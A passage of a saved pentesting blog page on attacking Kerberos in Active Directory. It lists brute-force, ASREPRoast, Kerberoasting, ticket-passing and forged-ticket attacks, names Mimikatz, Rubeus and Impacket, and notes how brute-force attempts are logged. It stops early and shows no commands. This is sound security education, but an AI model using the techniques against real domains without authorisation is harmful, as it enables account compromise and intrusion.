<!DOCTYPE html>
<html prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb#" data-useragent="Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" slick-uniqueid="3" lang="en-US"><head> <script type="text/javascript" async="" src="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/analytics.js"></script><script async="" src="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/gtm.js"></script><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
	new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
	j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
	'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
	})(window,document,'script','dataLayer','GTM-NZJDZCN');</script> <meta http-equiv="X-UA-Compatible" content="IE=edge"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"><link rel="preload" href="https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/assets/fonts/Helvetica.woff2" as="font" type="font/woff2" crossorigin="anonymous"><link rel="preload" href="https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/assets/fonts/BigJohn.woff2" as="font" type="font/woff2" crossorigin="anonymous"><link rel="preload" href="https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/assets/fonts/Helvetica-Bold.woff2" as="font" type="font/woff2" crossorigin="anonymous"><link rel="preload" href="https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/assets/fonts/Helvetica-Light.woff2" as="font" type="font/woff2" crossorigin="anonymous"><title>Kerberos (II): How to attack Kerberos? - Tarlogic Security - Cyber Security and Ethical hacking</title><link rel="alternate" hreflang="es" href="https://www.tarlogic.com/blog/como-atacar-kerberos/"><link rel="alternate" hreflang="en" href="https://www.tarlogic.com/en/blog/how-to-attack-kerberos/"><meta name="description" content="In this article about Kerberos, the following attacks against the protocol will be explained: Kerberos brute-force, ASREPRoast, Kerberoasting, Pass the key, Pass the ticket, Silver ticket and Golden ticket."><meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"><link rel="canonical" href="https://www.tarlogic.com/en/blog/how-to-attack-kerberos/"><meta property="og:locale" content="en_US"><meta property="og:type" content="article"><meta property="og:title" content="Kerberos (II): How to attack Kerberos? - Tarlogic Security - Cyber Security and Ethical hacking"><meta property="og:description" content="In this article about Kerberos, the following attacks against the protocol will be explained: Kerberos brute-force, ASREPRoast, Kerberoasting, Pass the key, Pass the ticket, Silver ticket and Golden ticket."><meta property="og:url" content="https://www.tarlogic.com/en/blog/how-to-attack-kerberos/"><meta property="og:site_name" content="Tarlogic Security - Cyber Security and Ethical hacking"><meta property="article:tag" content="hacking"><meta property="article:tag" content="How to attack Kerberos"><meta property="article:tag" content="Kerberos"><meta property="article:tag" content="kerberos attack"><meta property="article:section" content="Cybersecurity"><meta property="article:published_time" content="2019-06-04T09:26:55+00:00"><meta property="article:modified_time" content="2019-12-02T12:44:31+00:00"><meta property="og:updated_time" content="2019-12-02T12:44:31+00:00"><meta property="og:image" content="https://www.tarlogic.com/wp-content/uploads/2019/06/kerberosII.png"><meta property="og:image:secure_url" content="https://www.tarlogic.com/wp-content/uploads/2019/06/kerberosII.png"><meta property="og:image:width" content="371"><meta property="og:image:height" content="219"><link rel="dns-prefetch" href="https://s.w.org/"><link rel="dns-prefetch" href="https://www.googletagmanager.com/"><link rel="dns-prefetch" href="https://maps.googleapis.com/"><link rel="alternate" type="application/rss+xml" title="Tarlogic Security - Cyber Security and Ethical hacking » Feed" href="https://www.tarlogic.com/en/feed/"><link rel="alternate" type="application/rss+xml" title="Tarlogic Security - Cyber Security and Ethical hacking » Comments Feed" href="https://www.tarlogic.com/en/comments/feed/"><link rel="shortcut icon" href="https://www.tarlogic.com/wp-content/uploads/2016/11/FAVICON-01.png" type="image/x-icon"><link rel="apple-touch-icon" href="https://www.tarlogic.com/wp-content/uploads/2016/11/FAVICON-01.png"><link rel="apple-touch-icon" sizes="114x114" href="https://www.tarlogic.com/wp-content/uploads/2016/11/FAVICON-01.png"><link rel="apple-touch-icon" sizes="72x72" href="https://www.tarlogic.com/wp-content/uploads/2016/11/FAVICON-01.png"><link rel="apple-touch-icon" sizes="144x144" href="https://www.tarlogic.com/wp-content/uploads/2016/11/FAVICON-01.png"><link rel="alternate" type="application/rss+xml" title="Tarlogic Security - Cyber Security and Ethical hacking » Kerberos (II): How to attack Kerberos? Comments Feed" href="https://www.tarlogic.com/en/blog/how-to-attack-kerberos/feed/"><meta property="og:title" content="Kerberos (II): How to attack Kerberos?"><meta property="og:type" content="article"><meta property="og:url" content="https://www.tarlogic.com/en/blog/how-to-attack-kerberos/"><meta property="og:site_name" content="Tarlogic Security - Cyber Security and Ethical hacking"><meta property="og:description" content="Introduction In this article about Kerberos, a few attacks against the protocol will be shown. In order to refresh the concepts behind the following attacks, it is recommended to check the first part of this series which covers Kerberos theory. The post is divided in one section per attack: Kerberos brute-force ASREPRoast Kerberoasting Pass the"><meta property="og:image" content="https://www.tarlogic.com/wp-content/uploads/2019/06/kerberosII.png"> <script type="text/javascript">window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.tarlogic.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.3.2"}};
			!function(e,a,t){var r,n,o,i,p=a.createElement("canvas"),s=p.getContext&&p.getContext("2d");function c(e,t){var a=String.fromCharCode;s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,e),0,0);var r=p.toDataURL();return s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,t),0,0),r===p.toDataURL()}function l(e){if(!s||!s.fillText)return!1;switch(s.textBaseline="top",s.font="600 32px Arial",e){case"flag":return!c([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])&&(!c([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!c([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]));case"emoji":return!c([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340])}return!1}function d(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(i=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},o=0;o<i.length;o++)t.supports[i[o]]=l(i[o]),t.supports.everything=t.supports.everything&&t.supports[i[o]],"flag"!==i[o]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[i[o]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(r=t.source||{}).concatemoji?d(r.concatemoji):r.wpemoji&&r.twemoji&&(d(r.twemoji),d(r.wpemoji)))}(window,document,window._wpemojiSettings);</script><script src="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/wp-emoji-release.js" type="text/javascript" defer="defer"></script> <style type="text/css">img.wp-smiley,img.emoji{display:inline!important;border:none!important;box-shadow:none!important;height:1em!important;width:1em!important;margin:0 .07em!important;vertical-align:-0.1em!important;background:none!important;padding:0!important}</style><link data-minify="1" rel="stylesheet" id="tar-post-styles-css" href="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/single_post-bf945f8b6c88842696425830b319d2ce.css" type="text/css" media="all"><link data-minify="1" rel="stylesheet" id="section-css" href="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/section-24611d00591c78263b76a9dbd1a2ee0f.css" type="text/css" media="all"><link data-minify="1" rel="stylesheet" id="tar-images-ligthbox-css" href="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/image_ligthbox-19d2822dafd1a1ff4e62f281afa908ec.css" type="text/css" media="all"><link data-minify="1" rel="stylesheet" id="wpml-legacy-horizontal-list-0-css" href="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/style-b9cca14bc1d29145c2d15ceff4e3461b.css" type="text/css" media="all"><link data-minify="1" rel="stylesheet" id="tar-main-style-css" href="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/main-1b0d430df27a062283ef4dcf2abf3e70.css" type="text/css" media="all"><link data-minify="1" rel="stylesheet" id="tar-header-css" href="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/header-a50f9ca05f10b90bfe6d33e0084eec21.css" type="text/css" media="all"><link rel="stylesheet" id="enlighter-local-css" href="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/EnlighterJS.css" type="text/css" media="all"><link data-minify="1" rel="stylesheet" id="infocookies-bar-style-css" href="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/cookies_bar-03d628b5c4acc92669f46acfdebcf4ab.css" type="text/css" media="all"><link data-minify="1" rel="stylesheet" id="tar-modal-css" href="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/modal-3a8c929b83acf1d45b5fdc0a82d1e1fe.css" type="text/css" media="all"><style id="rocket-lazyload-inline-css" type="text/css">.rll-youtube-player{position:relative;padding-bottom:56.23%;height:0;overflow:hidden;max-width:100%}.rll-youtube-player iframe{position:absolute;top:0;left:0;width:100%;height:100%;z-index:100;background:0 0}.rll-youtube-player img{bottom:0;display:block;left:0;margin:auto;max-width:100%;width:100%;position:absolute;right:0;top:0;border:none;height:auto;cursor:pointer;-webkit-transition:.4s all;-moz-transition:.4s all;transition:.4s all}.rll-youtube-player img:hover{-webkit-filter:brightness(75%)}.rll-youtube-player .play{height:72px;width:72px;left:50%;top:50%;margin-left:-36px;margin-top:-36px;position:absolute;background:url(https://www.tarlogic.com/wp-content/plugins/wp-rocket/assets/img/youtube.png) no-repeat;cursor:pointer}</style> <script type="text/javascript">/* <![CDATA[ */ var global_vars = {"lang":"en"}; /* ]]> */</script> <script type="text/javascript" src="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/global_vars.js"></script> <script data-minify="1" type="text/javascript" src="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/load_polyfills-a6979e921c0f8495f745e52e0efbac50.js"></script> <link rel="https://api.w.org/" href="https://www.tarlogic.com/wp-json/"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.tarlogic.com/xmlrpc.php?rsd"><link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://www.tarlogic.com/wp-includes/wlwmanifest.xml"><link rel="shortlink" href="https://www.tarlogic.com/en/?p=19268"> <script type="application/ld+json">[{"@context":"http:\/\/schema.org\/","@type":"WPHeader","url":"https:\/\/www.tarlogic.com\/en\/blog\/how-to-attack-kerberos\/","headline":"Kerberos (II): How to attack Kerberos?","description":"Introduction In this article about Kerberos, a few attacks against the protocol will be shown. In order to..."},{"@context":"http:\/\/schema.org\/","@type":"WPFooter","url":"https:\/\/www.tarlogic.com\/en\/blog\/how-to-attack-kerberos\/","headline":"Kerberos (II): How to attack Kerberos?","description":"Introduction In this article about Kerberos, a few attacks against the protocol will be shown. In order to...","copyrightYear":"2019"}]</script> <script type="application/ld+json">{"@context":"http:\/\/schema.org\/","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/www.tarlogic.com\/en\/blog\/how-to-attack-kerberos\/"},"url":"https:\/\/www.tarlogic.com\/en\/blog\/how-to-attack-kerberos\/","headline":"Kerberos (II): How to attack...","datePublished":"2019-06-04T11:26:55+02:00","dateModified":"2019-12-02T13:44:31+01:00","publisher":{"@type":"Organization","@id":"https:\/\/www.tarlogic.com\/en\/#organization","name":"Tarlogic Security","logo":{"@type":"ImageObject","url":"https:\/\/www.tarlogic.com\/wp-content\/uploads\/2016\/12\/LOGOTIPO_TARLOGIC_WEB.png","width":600,"height":60}},"image":{"@type":"ImageObject","url":"https:\/\/www.tarlogic.com\/wp-content\/uploads\/2019\/06\/kerberosII.png","width":696,"height":219},"articleSection":"BlackArrow","keywords":"hacking, How to attack Kerberos, Kerberos, kerberos attack","description":"Introduction In this article about Kerberos, a few attacks against the protocol will be shown. In order to refresh the concepts behind the following attacks, it is recommended to check the first part of this series which covers Kerberos theory. The post is divided in one section per attack:","author":{"@type":"Person","name":"Eloy Pérez","url":"https:\/\/www.tarlogic.com\/en\/blog\/author\/eloy-pereztarlogic-com\/","image":{"@type":"ImageObject","url":"https:\/\/secure.gravatar.com\/avatar\/aef78b0d8eb6bff91accf3fb03a9934b?s=96&d=mm&r=g","height":96,"width":96}},"video":[null,null,null,null],"audio":[null,null,null,null],"commentCount":"3","comment":[{"@type":"Comment","dateCreated":"2020-03-12 04:34:22","description":"Excellent article! Great job of organizing all this data in an easy to read format!","author":{"@type":"Person","name":"Jorko: Wonderchimp","url":""}},{"@type":"Comment","dateCreated":"2020-02-12 17:19:01","description":"Thanks for sharing  Active directory auditor tips.  for more info i rfer cion systems  Active directory auditor in USA.","author":{"@type":"Person","name":"cionsystems","url":""}},{"@type":"Comment","dateCreated":"2019-06-07 08:28:08","description":"Hi, thats an excellent question because that command could be a little confusing, however it is not a mistake. Mimikatz uses the same command (kerberos::golden) to generate silver and golden tickets. It generates an TGS or TGT based on the arguments provided, more specifically, if you provide the service parameter, then a TGS will be generated. There is more information in https:\/\/github.com\/gentilkiwi\/mimikatz\/wiki\/module-~-kerberos#golden--silver.","author":{"@type":"Person","name":"Eloy Pérez","url":""}},{"@type":"Comment","dateCreated":"2019-06-07 05:12:31","description":"HiIt looks like the Mimikatz for Windows for Siverticket was accidentally replace with the Golden ticket procedure. Is that right? Or am I missing something?","author":{"@type":"Person","name":"Jesse","url":""}},{"@type":"Comment","dateCreated":"2019-06-04 16:29:02","description":"great reading!!!!!!! thank you for sharing!","author":{"@type":"Person","name":"Smokey","url":""}}]}</script> <style type="text/css" id="css-fb-visibility">@media screen and (max-width:640px){body:not(.fusion-builder-ui-wireframe) .fusion-no-small-visibility{display:none!important}}@media screen and (min-width:641px) and (max-width:1024px){body:not(.fusion-builder-ui-wireframe) .fusion-no-medium-visibility{display:none!important}}@media screen and (min-width:1025px){body:not(.fusion-builder-ui-wireframe) .fusion-no-large-visibility{display:none!important}}</style> <script type="application/ld+json">{
    "@context": "http://schema.org",
    "@type": "BreadcrumbList",
    "itemListElement": [
        {
            "@type": "ListItem",
            "position": 1,
            "item": {
                "@id": "https://www.tarlogic.com",
                "name": "Home"
            }
        },
        {
            "@type": "ListItem",
            "position": 2,
            "item": {
                "@id": "https://www.tarlogic.com/en/blog/how-to-attack-kerberos/",
                "name": "Kerberos (II): How to attack Kerberos?",
                "image": "https://www.tarlogic.com/wp-content/uploads/2019/06/kerberosII.png"
            }
        }
    ]
}</script> <link rel="amphtml" href="https://www.tarlogic.com/en/blog/how-to-attack-kerberos/amp/"><meta name="generator" content="Powered by Slider Revolution 6.2.2 - responsive, Mobile-Friendly Slider Plugin for WordPress with comfortable drag and drop interface."> <script type="text/javascript">function setREVStartSize(e){			
			try {								
				var pw = document.getElementById(e.c).parentNode.offsetWidth,
					newh;
				pw = pw===0 || isNaN(pw) ? window.innerWidth : pw;
				e.tabw = e.tabw===undefined ? 0 : parseInt(e.tabw);
				e.thumbw = e.thumbw===undefined ? 0 : parseInt(e.thumbw);
				e.tabh = e.tabh===undefined ? 0 : parseInt(e.tabh);
				e.thumbh = e.thumbh===undefined ? 0 : parseInt(e.thumbh);
				e.tabhide = e.tabhide===undefined ? 0 : parseInt(e.tabhide);
				e.thumbhide = e.thumbhide===undefined ? 0 : parseInt(e.thumbhide);
				e.mh = e.mh===undefined || e.mh=="" || e.mh==="auto" ? 0 : parseInt(e.mh,0);		
				if(e.layout==="fullscreen" || e.l==="fullscreen") 						
					newh = Math.max(e.mh,window.innerHeight);				
				else{					
					e.gw = Array.isArray(e.gw) ? e.gw : [e.gw];
					for (var i in e.rl) if (e.gw[i]===undefined || e.gw[i]===0) e.gw[i] = e.gw[i-1];					
					e.gh = e.el===undefined || e.el==="" || (Array.isArray(e.el) && e.el.length==0)? e.gh : e.el;
					e.gh = Array.isArray(e.gh) ? e.gh : [e.gh];
					for (var i in e.rl) if (e.gh[i]===undefined || e.gh[i]===0) e.gh[i] = e.gh[i-1];
										
					var nl = new Array(e.rl.length),
						ix = 0,						
						sl;					
					e.tabw = e.tabhide>=pw ? 0 : e.tabw;
					e.thumbw = e.thumbhide>=pw ? 0 : e.thumbw;
					e.tabh = e.tabhide>=pw ? 0 : e.tabh;
					e.thumbh = e.thumbhide>=pw ? 0 : e.thumbh;					
					for (var i in e.rl) nl[i] = e.rl[i]<window.innerWidth ? 0 : e.rl[i];
					sl = nl[0];									
					for (var i in nl) if (sl>nl[i] && nl[i]>0) { sl = nl[i]; ix=i;}															
					var m = pw>(e.gw[ix]+e.tabw+e.thumbw) ? 1 : (pw-(e.tabw+e.thumbw)) / (e.gw[ix]);					

					newh =  (e.type==="carousel" && e.justify==="true" ? e.gh[ix] : (e.gh[ix] * m)) + (e.tabh + e.thumbh);
				}			
				
				if(window.rs_init_css===undefined) window.rs_init_css = document.head.appendChild(document.createElement("style"));					
				document.getElementById(e.c).height = newh;
				window.rs_init_css.innerHTML += "#"+e.c+"_wrapper { height: "+newh+"px }";				
			} catch(e){
				console.log("Failure at Presize of Slider:" + e)
			}					   
		  };</script> <script type="text/javascript">var doc = document.documentElement;
			doc.setAttribute( 'data-useragent', navigator.userAgent );</script> <noscript><style id="rocket-lazyload-nojs-css">.rll-youtube-player,[data-lazy-src]{display:none!important}</style></noscript> <script type="text/javascript">var doc = document.documentElement;
		doc.setAttribute('data-useragent', navigator.userAgent);</script> <script>var idioma = 'en';</script> <script type="text/javascript" src="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/load_resources.js"></script><link rel="prefetch" href="https://www.tarlogic.com/blog/como-atacar-kerberos/"><link rel="prefetch" href="https://www.tarlogic.com/en/"><link rel="prefetch" href="https://www.tarlogic.com/en/cybersecurity-services/"><link rel="prefetch" href="https://www.tarlogic.com/en/blackarrow-offensive-driven-defense-services/"><link rel="prefetch" href="https://www.tarlogic.com/en/cyber-intelligence-global-risks-services/"><link rel="prefetch" href="https://www.tarlogic.com/en/blog/"><link rel="prefetch" href="https://www.tarlogic.com/en/blog/category/cybersecurity/"><link rel="prefetch" href="https://www.tarlogic.com/en/blog/category/blackarrow-blog/"><link rel="prefetch" href="https://www.tarlogic.com/en/blog/category/cyberintelligence-blog/"><link rel="prefetch" href="https://www.tarlogic.com/en/contact/"><link rel="prefetch" href="https://www.tarlogic.com/en/cybersecurity-blog/"><link rel="prefetch" href="https://www.tarlogic.com/en/blog/how-kerberos-works/"></head><body class="post-template-default single single-post postid-19268 single-format-standard fusion-image-hovers fusion-pagination-sizing fusion-button_size-large fusion-button_type-flat fusion-button_span-no avada-image-rollover-circle-yes avada-image-rollover-yes avada-image-rollover-direction-left fusion-body ltr fusion-sticky-header no-mobile-slidingbar fusion-disable-outline fusion-sub-menu-fade mobile-logo-pos-left layout-wide-mode avada-has-boxed-modal-shadow-none layout-scroll-offset-full avada-has-zero-margin-offset-top fusion-top-header menu-text-align-center mobile-menu-design-modern fusion-show-pagination-text fusion-header-layout-v3 avada-responsive avada-footer-fx-none avada-menu-highlight-style-bar fusion-search-form-classic fusion-main-menu-search-dropdown fusion-avatar-square avada-sticky-shrinkage avada-blog-layout-grid avada-blog-archive-layout-grid avada-header-shadow-no avada-menu-icon-position-left avada-has-megamenu-shadow avada-has-mainmenu-dropdown-divider avada-has-pagetitle-100-width avada-has-breadcrumb-mobile-hidden avada-has-titlebar-bar_and_content avada-has-pagination-padding avada-flyout-menu-direction-fade avada-ec-views-v1"> <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-NZJDZCN" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><header class="header"><div class="header__bars"><div class="bar_top"><div class="tar_wrapper tar_wrapper--menu"><div class="lang_sel_list_horizontal wpml-ls-statics-shortcode_actions wpml-ls wpml-ls-legacy-list-horizontal" id="lang_sel_list"><ul><li class="icl-es wpml-ls-slot-shortcode_actions wpml-ls-item wpml-ls-item-es wpml-ls-first-item wpml-ls-item-legacy-list-horizontal"> <a href="https://www.tarlogic.com/blog/como-atacar-kerberos/" class="wpml-ls-link"><span class="wpml-ls-display icl_lang_sel_translated">ES</span></a></li><li class="icl-en wpml-ls-slot-shortcode_actions wpml-ls-item wpml-ls-item-en wpml-ls-current-language wpml-ls-last-item wpml-ls-item-legacy-list-horizontal"> <a href="https://www.tarlogic.com/en/blog/how-to-attack-kerberos/" class="wpml-ls-link"><span class="wpml-ls-native icl_lang_sel_native">EN</span></a></li></ul></div></div></div><div class="bar_menu"><div class="tar_wrapper tar_wrapper--menu"> <a href="https://www.tarlogic.com/en/" class="bar_menu__logo"> <picture> <source media="(min-width: 650px)" srcset="https://www.tarlogic.com/wp-content/uploads/2016/12/LOGOTIPO_TARLOGIC_WEB.png"> <img src="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/LOGOTIPO_TARLOGIC_WEB.png" alt="Tarlogic Logo"> </picture> </a> <button id="menu__hamburger" class="menu__hamburger" role="button"></button><nav id="menu" class="menu"><ul class="main_menu"><li id="menu-item-15911" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15911"><a href="https://www.tarlogic.com/en/">Home</a></li><li id="menu-item-20092" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-20092"><a href="https://www.tarlogic.com/en/cybersecurity-services/">Cybersecurity</a></li><li id="menu-item-20630" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-20630"><a href="https://www.tarlogic.com/en/blackarrow-offensive-driven-defense-services/">BlackArrow</a></li><li id="menu-item-20629" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-20629"><a href="https://www.tarlogic.com/en/cyber-intelligence-global-risks-services/">Cyber Intelligence</a></li><li id="menu-item-13635" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-13635"><a title="Cybersecurity blog" href="https://www.tarlogic.com/en/blog/">Blog</a><ul class="sub-menu"><li id="menu-item-20282" class="icon_menu_security menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-20282"><a href="https://www.tarlogic.com/en/blog/category/cybersecurity/">Cybersecurity Blog</a></li><li id="menu-item-20565" class="ba_menu_arrow menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-20565"><a href="https://www.tarlogic.com/en/blog/category/blackarrow-blog/">BlackArrow blog</a></li><li id="menu-item-20275" class="icon_menu_intel menu-item menu-item-type-taxonomy menu-item-object-category menu-item-20275"><a href="https://www.tarlogic.com/en/blog/category/cyberintelligence-blog/">Cyber intelligence blog</a></li></ul></li><li id="menu-item-13307" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-13307"><a href="https://www.tarlogic.com/en/contact/">Contact</a></li></ul></nav></div></div></div></header><main role="main"><picture> <source data-srcset="https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/blog-tarlogic-banner-post_l.jpg" media="(min-width: 1200px)" srcset="https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/blog-tarlogic-banner-post_l.jpg"> <source data-srcset="https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/blog-tarlogic-banner-post_m.jpg" media="(min-width: 900px)" srcset="https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/blog-tarlogic-banner-post_m.jpg"> <source data-srcset="https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/blog-tarlogic-banner-post_s.jpg" media="(min-width: 600px)" srcset="https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/blog-tarlogic-banner-post_s.jpg"> <img src="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/blog-tarlogic-banner-post_xs.jpg" data-src="https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/blog-tarlogic-banner-post_xs.jpg" class="header__background teaser lazyloaded" alt="Typewritter"> </picture><section class="section single_post"><article><header class="single_post__header"><div class="single_post__return"> <a href="https://www.tarlogic.com/en/cybersecurity-blog/" class="single_post__return_button button">Return to blog</a></div><div class="single_post__content"><h1 class="single_post__title">Kerberos (II): How to attack Kerberos?</h1> <span class="single_post__entry_date__author"> <time datetime="2019-06-04">04 - Jun - 2019</time> - Eloy Pérez </span></div></header><div class="single_post__content"><link data-minify="1" rel="stylesheet" id="post_series_block-css" href="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/post_series_block-56177a47ca78b908e6407cffa2f0de26.css" type="text/css" media="all"><h2></h2><h3>Introduction</h3><div><div>In
 this article about Kerberos, a few attacks against the protocol will be
 shown. In order to refresh the concepts behind the following attacks, 
it is recommended to check the first part of this series which covers <a href="https://www.tarlogic.com/en/blog/how-kerberos-works/">Kerberos theory</a>.</div></div><div></div><div><div><div>The post is divided in one section per attack:</div><ul><li>Kerberos brute-force</li><li>ASREPRoast</li><li>Kerberoasting</li><li>Pass the key</li><li>Pass the ticket</li><li>Silver ticket</li><li>Golden ticket</li></ul></div><div><div>These
 attacks are sorted by the privileges needed to perform them, in 
ascending order. Thus, to perform the first attacks only connectivity 
with the DC (Domain Controller) is required, which is the KDC (Key 
Distribution Center) for the AD (Active Directory) network. Whereas, the
 last attack requires a user being a Domain Administrator or having 
similar privileges.</div><div></div></div><div><div><div>Furthermore, each attack will be introduced from the pentesting perspective of 2 common scenarios:</div><div><div><ul><li><strong>Linux machine</strong>:
 A computer external to the domain, owned by the auditor (Kali in this 
case), but with network connectivity to the DC (directly, VPN, Socks, 
does not really matter). It must be taken into account that the local 
time of the machine has to be synchronized with the DC.</li><li><strong>Windows machine</strong>:
 A compromised Windows machine in the domain, with a domain account if 
needed but with no administrator privileges, neither local nor domain.</li></ul><div>It
 is done this way because there are plenty of publications only covering
 part of one scenario. Therefore, the goal here is to present a useful 
guide that shows how to perform any attack in many different 
circumstances. Anyway, a comment can be leaving by anyone if any concept
 is not completely explained.</div></div></div></div></div></div><h3>Tools</h3><div>First of all, throughout this article the following main tools are used:</div><ul><li>Examples of <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>, to perform Kerberos related Linux attacks, which requires python installed on the machine.</li><li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a>, for Windows attacks.</li><li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a>, for Windows attacks, which requires Redistributable 3.5 installed on the machine.</li><li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a>, for executing commands from Windows in remote machines.</li></ul><div>There are a few additional tools, but those will be introduced in their respective sections. Besides, a <a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a">Kerberos attacks cheatsheet</a> was created to quickly get the commands needed to perform any of these attacks.</div><div></div><div>Let’s go with the interesting stuff.</div><div><h3>Kerberos brute-force</h3><div>In
 first place, due to Kerberos is an authentication protocol, it is 
possible to perform brute-force attacks against it. Moreover, 
brute-forcing Kerberos has many advantages over brute-forcing other 
authentication methods, like the following:</div><ul><li>No domain account is needed to conduct the attack, just connectivity to the KDC.</li><li>Kerberos
 pre-authentication errors are not logged in Active Directory with a 
normal Logon failure event (4625), but rather with specific logs to 
Kerberos pre-authentication failure (4771).</li><li>Kerberos indicates, 
even if the password is wrong, whether the username is correct or not. 
This is a huge advantage in case of performing this sort of technique 
without knowing any username.</li><li>In Kerberos brute-forcing it is 
also possible to discover user accounts without pre-authentication 
